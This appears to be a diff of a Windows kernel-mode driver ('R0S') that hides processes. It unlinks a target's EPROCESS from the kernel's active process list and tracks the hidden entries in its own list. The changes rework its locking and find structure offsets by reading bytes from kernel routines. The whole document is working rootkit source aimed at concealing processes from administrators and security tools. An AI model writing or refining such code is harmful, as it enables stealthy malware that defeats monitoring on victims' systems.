@@ -117,9 +117,9 @@ PDEVICE_OBJECT g_DeviceObject = NULL;
 UNICODE_STRING g_SymLinkName;
 
 static LIST_ENTRY g_HiddenListHead;
-static KSPIN_LOCK g_HiddenListLock;
+static PERESOURCE g_pPsActiveProcessMutex = NULL;
 
-static ULONG g_PreviousModeOffset = 0x232; 
+static ULONG g_PreviousModeOffset = 0x232;
 static ULONG g_ActiveProcessLinksOffset = 0x448;
 
 NTSTATUS DriverEntry(PDRIVER_OBJECT, PUNICODE_STRING);
@@ -143,21 +143,21 @@ NTSTATUS InitDynamicOffsets(VOID) {
     pExGetPrevMode = MmGetSystemRoutineAddress(&us);
     if (!pExGetPrevMode) {
         DbgPrint("[R0S] CRITICAL ERROR: Failed to get ExGetPreviousMode address.\n");
-        return STATUS_NOT_FOUND; 
+        return STATUS_NOT_FOUND;
     }
 
     pCode = (UCHAR*)pExGetPrevMode;
     __try {
         offset = *(USHORT*)(pCode + 0x0C);
-        
+
         if (offset < 0x100 || offset > 0x500) {
             DbgPrint("[R0S] CRITICAL ERROR: PreviousMode offset out of range: 0x%X\n", offset);
             return STATUS_INVALID_PARAMETER;
         }
-        
+
         g_PreviousModeOffset = offset;
         DbgPrint("[R0S] SUCCESS: PreviousMode offset = 0x%X\n", offset);
-    } 
+    }
     __except (EXCEPTION_EXECUTE_HANDLER) {
         DbgPrint("[R0S] CRITICAL EXCEPTION: Reading ExGetPreviousMode, Code: 0x%X\n", GetExceptionCode());
         return GetExceptionCode();
@@ -174,15 +174,15 @@ NTSTATUS InitDynamicOffsets(VOID) {
     __try {
         offset = *(USHORT*)(pCode + 0x03);
         g_ActiveProcessLinksOffset = offset + 0x08;
-        
+
         if (g_ActiveProcessLinksOffset < 0x300 || g_ActiveProcessLinksOffset > 0x600) {
             DbgPrint("[R0S] CRITICAL ERROR: ActiveProcessLinks offset out of range: 0x%X\n", g_ActiveProcessLinksOffset);
             return STATUS_INVALID_PARAMETER;
         }
-        
-        DbgPrint("[R0S] SUCCESS: UniqueProcessId offset = 0x%X, ActiveProcessLinks = 0x%X\n", 
+
+        DbgPrint("[R0S] SUCCESS: UniqueProcessId offset = 0x%X, ActiveProcessLinks = 0x%X\n",
                  offset, g_ActiveProcessLinksOffset);
-    } 
+    }
     __except (EXCEPTION_EXECUTE_HANDLER) {
         DbgPrint("[R0S] CRITICAL EXCEPTION: Reading PsGetProcessId, Code: 0x%X\n", GetExceptionCode());
         return GetExceptionCode();
@@ -194,7 +194,7 @@ NTSTATUS InitDynamicOffsets(VOID) {
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
     NTSTATUS status;
     PDEVICE_OBJECT deviceObject;
-    UNICODE_STRING devName;
+    UNICODE_STRING devName, mutexName;
 
     RtlInitUnicodeString(&devName, DEVICE_NAME);
     RtlInitUnicodeString(&g_SymLinkName, SYM_LINK_NAME);
@@ -220,7 +220,9 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
     DriverObject->DriverUnload = DriverUnload;
 
     InitializeListHead(&g_HiddenListHead);
-    KeInitializeSpinLock(&g_HiddenListLock);
+
+    RtlInitUnicodeString(&mutexName, L"PsActiveProcessMutex");
+    g_pPsActiveProcessMutex = (PERESOURCE)MmGetSystemRoutineAddress(&mutexName);
 
     InitDynamicOffsets();
 
@@ -230,29 +232,37 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 
 VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
     PHIDDEN_PROCESS_ENTRY pEntry, pNext;
-    KIRQL oldIrql;
+    PLIST_ENTRY pList;
+    PEPROCESS pProc, pSys;
+    PLIST_ENTRY pLink, pSysLink;
 
-    KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
-    for (PLIST_ENTRY pList = g_HiddenListHead.Flink; pList != &g_HiddenListHead; pList = (PLIST_ENTRY)pNext) {
+    if (g_pPsActiveProcessMutex) {
+        ExAcquireResourceExclusiveLite(g_pPsActiveProcessMutex, TRUE);
+    }
+
+    pList = g_HiddenListHead.Flink;
+    while (pList != &g_HiddenListHead) {
         pEntry = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
         pNext = (PHIDDEN_PROCESS_ENTRY)pList->Flink;
 
         RemoveEntryList(&pEntry->ListEntry);
-        KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
 
-        PEPROCESS pProc = pEntry->EProcess;
+        pProc = pEntry->EProcess;
         if (pProc) {
-            PLIST_ENTRY pLink = (PLIST_ENTRY)((PCHAR)pProc + g_ActiveProcessLinksOffset);
-            PEPROCESS pSys = PsInitialSystemProcess;
-            PLIST_ENTRY pSysLink = (PLIST_ENTRY)((PCHAR)pSys + g_ActiveProcessLinksOffset);
+            pLink = (PLIST_ENTRY)((PCHAR)pProc + g_ActiveProcessLinksOffset);
+            pSys = PsInitialSystemProcess;
+            pSysLink = (PLIST_ENTRY)((PCHAR)pSys + g_ActiveProcessLinksOffset);
             InsertHeadList(pSysLink, pLink);
             ObDereferenceObject(pProc);
         }
         ExFreePoolWithTag(pEntry, 'HIDE');
 
-        KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
+        pList = (PLIST_ENTRY)pNext;
     }
-    KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
+
+    if (g_pPsActiveProcessMutex) {
+        ExReleaseResourceLite(g_pPsActiveProcessMutex);
+    }
 
     if (g_DeviceObject) {
         IoDeleteSymbolicLink(&g_SymLinkName);
@@ -417,6 +427,9 @@ static NTSTATUS HandleProcessHiding(PVOID InputBuffer, ULONG InputSize,
         if (op != R0SKPH_OP_ADD && op != R0SKPH_OP_REMOVE && op != R0SKPH_OP_LIST)
             return STATUS_INVALID_PARAMETER;
 
+        if (!g_pPsActiveProcessMutex)
+            return STATUS_UNSUCCESSFUL;
+
         if (op == R0SKPH_OP_ADD) {
             if (InputSize < sizeof(PROCESS_HIDING_INPUT) + sizeof(ULONG))
                 return STATUS_BUFFER_TOO_SMALL;
@@ -437,12 +450,11 @@ static NTSTATUS HandleProcessHiding(PVOID InputBuffer, ULONG InputSize,
             pEntry->EProcess = pTarget;
 
             PLIST_ENTRY pLink = (PLIST_ENTRY)((PCHAR)pTarget + g_ActiveProcessLinksOffset);
-            RemoveEntryList(pLink);
 
-            KIRQL oldIrql;
-            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
+            ExAcquireResourceExclusiveLite(g_pPsActiveProcessMutex, TRUE);
+            RemoveEntryList(pLink);
             InsertHeadList(&g_HiddenListHead, &pEntry->ListEntry);
-            KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
+            ExReleaseResourceLite(g_pPsActiveProcessMutex);
 
             if (OutputSize >= sizeof(NTSTATUS)) {
                 *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS;
@@ -459,23 +471,22 @@ static NTSTATUS HandleProcessHiding(PVOID InputBuffer, ULONG InputSize,
             ULONG pid = *(PULONG)((PUCHAR)InputBuffer + sizeof(PROCESS_HIDING_INPUT));
             if (pid == 0) return STATUS_INVALID_PARAMETER;
 
-            KIRQL oldIrql;
-            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
-
             PHIDDEN_PROCESS_ENTRY pEntry = NULL;
+
+            ExAcquireResourceExclusiveLite(g_pPsActiveProcessMutex, TRUE);
+
             PLIST_ENTRY pList = g_HiddenListHead.Flink;
             while (pList != &g_HiddenListHead) {
                 PHIDDEN_PROCESS_ENTRY pCur = CONTAINING_RECORD(pList, HIDDEN_PROCESS_ENTRY, ListEntry);
                 if ((ULONG)(ULONG_PTR)pCur->ProcessId == pid) {
                     pEntry = pCur;
-                    RemoveEntryList(&pEntry->ListEntry);
                     break;
                 }
                 pList = pList->Flink;
             }
-            KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
 
             if (!pEntry) {
+                ExReleaseResourceLite(g_pPsActiveProcessMutex);
                 if (OutputSize >= sizeof(NTSTATUS)) {
                     *(NTSTATUS*)OutputBuffer = STATUS_NOT_FOUND;
                     *Info = sizeof(NTSTATUS);
@@ -484,6 +495,8 @@ static NTSTATUS HandleProcessHiding(PVOID InputBuffer, ULONG InputSize,
                 }
                 return STATUS_NOT_FOUND;
             }
+
+            RemoveEntryList(&pEntry->ListEntry);
 
             PEPROCESS pProc = pEntry->EProcess;
             if (pProc) {
@@ -494,6 +507,8 @@ static NTSTATUS HandleProcessHiding(PVOID InputBuffer, ULONG InputSize,
                 ObDereferenceObject(pProc);
             }
             ExFreePoolWithTag(pEntry, 'HIDE');
+
+            ExReleaseResourceLite(g_pPsActiveProcessMutex);
 
             if (OutputSize >= sizeof(NTSTATUS)) {
                 *(NTSTATUS*)OutputBuffer = STATUS_SUCCESS;
@@ -509,8 +524,7 @@ static NTSTATUS HandleProcessHiding(PVOID InputBuffer, ULONG InputSize,
             if (OutputSize >= sizeof(ULONG))
                 maxCount = (OutputSize - sizeof(ULONG)) / sizeof(HANDLE);
 
-            KIRQL oldIrql;
-            KeAcquireSpinLock(&g_HiddenListLock, &oldIrql);
+            ExAcquireResourceExclusiveLite(g_pPsActiveProcessMutex, TRUE);
 
             ULONG count = 0;
             PLIST_ENTRY pList = g_HiddenListHead.Flink;
@@ -520,7 +534,8 @@ static NTSTATUS HandleProcessHiding(PVOID InputBuffer, ULONG InputSize,
                 count++;
                 pList = pList->Flink;
             }
-            KeReleaseSpinLock(&g_HiddenListLock, oldIrql);
+
+            ExReleaseResourceLite(g_pPsActiveProcessMutex);
 
             if (OutputSize >= sizeof(ULONG)) {
                 *(ULONG*)OutputBuffer = count;
